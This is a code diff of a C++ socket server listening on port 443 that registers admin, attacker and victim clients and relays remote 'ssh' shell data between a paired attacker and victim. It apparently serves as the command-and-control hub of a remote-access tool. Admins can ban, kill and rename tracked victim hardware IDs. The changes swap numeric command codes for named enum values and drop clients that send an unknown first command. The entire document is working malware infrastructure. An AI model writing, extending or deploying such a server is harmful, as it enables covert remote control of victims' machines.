@@ -1,10 +1,13 @@
 #include "server.hpp"
+#include "../commands.hpp"
+
 #include <exception>
 #include <set>
 #include <fstream>
 
 Server::Server()
 {
+	outputLog("");
 	outputLog("loaded " + std::to_string(loadDatabase()) + " hId datapoint(s) from file");
 
 	if (listener.listen(443) != sf::Socket::Status::Done)
@@ -77,7 +80,7 @@ int Server::processIncoming()
 		p >> reqId >> cmd;
 
 		//accept admin
-		if (cmd == std::uint8_t(1)) {
+		if (cmd == std::uint8_t(Cmd::REGISTER_ADMIN)) {
 			std::string hId, pw;
 			p >> hId >> pw;
 			if (database.find(hId) == database.end())
@@ -113,7 +116,7 @@ int Server::processIncoming()
 			}
 		}
 		//accept attacker
-		else if (cmd == std::uint8_t(2)) {
+		else if (cmd == std::uint8_t(Cmd::REGISTER_ATTACKER)) {
 			std::string hId;
 			p >> hId;
 			if (database.find(hId) == database.end())
@@ -148,7 +151,7 @@ int Server::processIncoming()
 			}
 		}
 		//accept victim
-		else if (cmd == std::uint8_t(3)) {
+		else if (cmd == std::uint8_t(Cmd::REGISTER_VICTIM)) {
 			std::string hId;
 			p >> hId;
 			if (database.find(hId) == database.end())
@@ -166,6 +169,15 @@ int Server::processIncoming()
 
 			outputLog(std::to_string(id) + " = victim: " + hId);
 			sendClientList();
+		}
+		//unknown first command
+		else {
+			outputLog("uninitialized client gone rogue (" + std::to_string(id) + ")");
+
+			selector.remove(*uninitialized[id].socket);
+			delete uninitialized[id].socket;
+
+			idsToRemove.insert(id);
 		}
 	}
 	for (const auto& id : idsToRemove)
@@ -197,13 +209,13 @@ int Server::processIncoming()
 		p >> reqId >> cmd;
 
 		//stop ssh
-		if (cmd == uint8_t(10)) {
+		if (cmd == uint8_t(Cmd::END_SSH)) {
 			//not paired or invalid pairing
 			if (c.sshId == 0 || clients.find(c.sshId) == clients.end())
 				continue;
 
 			sf::Packet res;
-			res << uint16_t(0) << uint8_t(10);
+			res << uint16_t(0) << uint8_t(Cmd::END_SSH);
 			auto _ = clients[c.sshId].socket->send(res);
 
 			clients[c.sshId].sshId = 0;
@@ -211,7 +223,7 @@ int Server::processIncoming()
 			continue;
 		}
 		//send ssh data
-		else if (cmd == uint8_t(11)) {
+		else if (cmd == uint8_t(Cmd::SSH_DATA)) {
 			if (c.sshId == 0 || clients.find(c.sshId) == clients.end())
 				continue;
 
@@ -219,7 +231,7 @@ int Server::processIncoming()
 			p >> data;
 
 			sf::Packet res;
-			res << uint16_t(0) << uint8_t(11) << data;
+			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << data;
 			auto _ = clients[c.sshId].socket->send(res);
 			continue;
 		}
@@ -228,7 +240,7 @@ int Server::processIncoming()
 			continue;
 
 		//change client name
-		if (cmd == uint8_t(5)) {
+		if (cmd == uint8_t(Cmd::CHANGE_NAME)) {
 			std::string hId, name;
 			p >> hId >> name;
 			if (c.isAdmin && database.find(hId) != database.end()) {
@@ -237,7 +249,7 @@ int Server::processIncoming()
 			}
 		}
 		//ban client
-		else if (cmd == uint8_t(6)) {
+		else if (cmd == uint8_t(Cmd::BAN_HID)) {
 			std::string hId;
 			p >> hId;
 
@@ -250,7 +262,7 @@ int Server::processIncoming()
 			}
 		}
 		//unban client
-		else if (cmd == uint8_t(7)) {
+		else if (cmd == uint8_t(Cmd::UNBAN_HID)) {
 			std::string hId;
 			p >> hId;
 
@@ -262,7 +274,7 @@ int Server::processIncoming()
 			}
 		}
 		//kill client
-		else if (cmd == uint8_t(8)) {
+		else if (cmd == uint8_t(Cmd::KILL)) {
 			uint16_t id;
 			p >> id;
 
@@ -271,8 +283,18 @@ int Server::processIncoming()
 				idsToDisconnect.insert(id);
 			}
 		}
+		//save database to file
+		else if (cmd == uint8_t(Cmd::SAVE_DATASET)) {
+			if (!c.isAdmin)
+				continue;
+
+			saveDatabase();
+			sf::Packet res;
+			res << reqId;
+			auto _ = c.socket->send(res);
+		}
 		//start ssh
-		else if (cmd == uint8_t(9)) {
+		else if (cmd == uint8_t(Cmd::START_SSH)) {
 			uint16_t oId;
 			p >> oId;
 			//1 = success, 2 = already paired, 3 = invalid id
@@ -295,9 +317,9 @@ int Server::processIncoming()
 					clients[oId].sshId = id;
 					c.sshId = oId;
 					code = uint8_t(1);
-				}				
+				}
 			}
-			else 
+			else
 				code = uint8_t(3);
 
 			sf::Packet res;
@@ -306,19 +328,9 @@ int Server::processIncoming()
 
 			if (code == uint8_t(1)) {
 				res.clear();
-				res << uint16_t(0) << uint8_t(9);
+				res << uint16_t(0) << uint8_t(Cmd::START_SSH);
 				_ = clients[oId].socket->send(res);
 			}
-		}
-		//save database to file
-		else if (cmd == uint8_t(12)) {
-			if (!c.isAdmin)
-				continue;
-
-			saveDatabase();
-			sf::Packet res;
-			res << reqId;
-			auto _ = c.socket->send(res);
 		}
 		//unkown command
 		else {
@@ -349,8 +361,8 @@ int Server::processIncoming()
 void Server::sendClientList() const
 {
 	sf::Packet admPacket, attPacket;
-	admPacket << uint16_t(0) << uint8_t(4) << uint16_t(database.size());
-	attPacket << uint16_t(0) << uint8_t(4) << uint16_t(0);
+	admPacket << uint16_t(0) << uint8_t(Cmd::CLIENTS_UPDATE) << uint16_t(database.size());
+	attPacket << uint16_t(0) << uint8_t(Cmd::CLIENTS_UPDATE) << uint16_t(0);
 
 	for (const auto& [hId, info] : database)
 		admPacket << hId << info.name << info.isBanned;
@@ -384,7 +396,7 @@ void Server::disconnectClient(uint16_t id)
 	//notify paired client about the disconnection
 	if (clients[id].sshId != 0 && clients.find(clients[id].sshId) != clients.end()) {
 		sf::Packet res;
-		res << uint16_t(0) << uint8_t(10);
+		res << uint16_t(0) << uint8_t(Cmd::END_SSH);
 		auto _ = clients[clients[id].sshId].socket->send(res);
 		clients[clients[id].sshId].sshId = 0;
 	}
